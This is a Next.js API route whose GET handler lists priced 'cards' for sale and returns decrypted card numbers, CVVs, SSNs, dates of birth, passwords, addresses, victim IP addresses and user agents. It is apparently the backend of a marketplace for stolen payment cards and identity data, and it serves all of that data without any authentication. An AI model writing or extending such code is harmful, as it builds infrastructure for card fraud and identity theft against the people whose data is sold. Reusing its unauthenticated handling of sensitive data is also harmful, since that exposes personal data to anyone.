import { NextRequest, NextResponse } from 'next/server';
import { connectDB } from '../../../lib/db';
import { Card } from '../../../lib/models';
import { decryptCardData } from '../../../lib/encryption';

export async function GET() {
    try {
        await connectDB();
        const cards = await Card.find({ forSale: true }).sort({ createdAt: -1 });

        const formattedCards = cards.map((card: { toObject: () => any; _id: { toString: () => any; }; title: any; price: any; description: any; forSale: any; expiry: any; bank: any; type: any; zip: any; city: any; state: any; country: any; userAgent: any; videoLink: any; }) => {
            const decrypted = decryptCardData(card.toObject());
            return {
                id: card._id.toString(),
                title: card.title,
                price: card.price,
                description: card.description,
                forSale: card.forSale,
                cardNumber: decrypted.cardNumber,
                cvv: decrypted.cvv,
                expiry: card.expiry,
                holder: decrypted.holder,
                address: decrypted.address,
                bank: card.bank,
                type: card.type,
                zip: card.zip,
                city: card.city,
                state: card.state,
                country: card.country,
                ssn: decrypted.ssn,
                dob: decrypted.dob,
                email: decrypted.email,
                phone: decrypted.phone,
                userAgent: card.userAgent,
                password: decrypted.password,
                ip: decrypted.ip,
                videoLink: card.videoLink
            };
        });

        return NextResponse.json({ cards: formattedCards });
    } catch (error) {
        console.error('Get cards error:', error);
        return NextResponse.json({ error: 'Server error' }, { status: 500 });
    }
}
